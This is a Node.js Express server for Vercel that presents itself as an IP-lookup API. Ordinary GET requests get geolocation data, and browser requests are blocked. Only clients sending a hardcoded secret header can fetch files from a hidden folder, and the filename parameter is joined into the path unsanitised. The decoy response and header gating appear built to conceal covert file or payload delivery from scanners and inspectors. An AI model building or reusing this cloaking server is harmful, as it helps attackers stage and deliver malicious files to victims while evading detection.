const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const axios = require("axios"); // To call external API for IP details
const requestIp = require("request-ip"); // To extract client's IP address

const SECRET_HEADER_VALUE = "secret";

const app = express();

// Path to the "15" folder
const folderPath = path.join(__dirname, "15");

// Enable CORS for all requests
app.use(cors());

// Rate Limiter Middleware to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: "Too many requests, please try again later.",
});

// Apply rate limiter globally
app.use(limiter);

// Middleware to extract client's IP
app.use(requestIp.mw());

// Middleware to check for the secret header
app.use(async (req, res, next) => {
  const secretHeader = req.headers["x-secret-header"];
  const clientIp = req.clientIp; // Extract the IP address
  
  if (req.method === "GET" && secretHeader !== SECRET_HEADER_VALUE) {
    try {
      // Fetch IP details using ip-api.com
      const ipApiResponse = await axios.get(`http://ip-api.com/json/${clientIp}`);
      const ipDetails = ipApiResponse.data;

      // Return IP details if the header is incorrect
      return res.json({
        ipInfo: ipDetails,
      });
    } catch (err) {
      // Fallback in case of an error with the external API
      return res.status(403).json({
        ipInfo: {
          query: clientIp,
          message: "Unable to fetch IP details.",
        },
      });
    }
  }
  next();
});

// Middleware to parse JSON requests
app.use(express.json());

// Route: List all available files in the "15" folder
// app.get("/", (req, res) => {
//   fs.readdir(folderPath, (err, files) => {
//     if (err) {
//       return res.status(500).json({ error: "Unable to read folder." });
//     }
//     res.json({ availableFiles: files });
//   });
// });

// Middleware to block GET requests from browsers
app.use((req, res, next) => {
  if (req.method === "GET") {
    const userAgent = req.headers["user-agent"];
    const origin = req.headers["origin"];

    // Check if the request comes from a browser
    if (userAgent && userAgent.includes("Mozilla") && origin) {
      return res.status(403).send("");
    }
  }
  next();
});

// Dynamic Route: Return file contents based on the filename in the "15" folder
app.get("/api/ipcheck/:filename", (req, res) => {
  const requestedFile = req.params.filename;
  const filePath = path.join(folderPath, requestedFile);

  // Check if the file exists
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) {
      return res.status(404).json({ error: "File not found." });
    }

    // Read the file content
    fs.readFile(filePath, "utf-8", (err, content) => {
      if (err) {
        return res.status(500).json({ error: "Unable to read the file." });
      }
      res.json(content);
    });
  });
});

// Export for Vercel
module.exports = app;

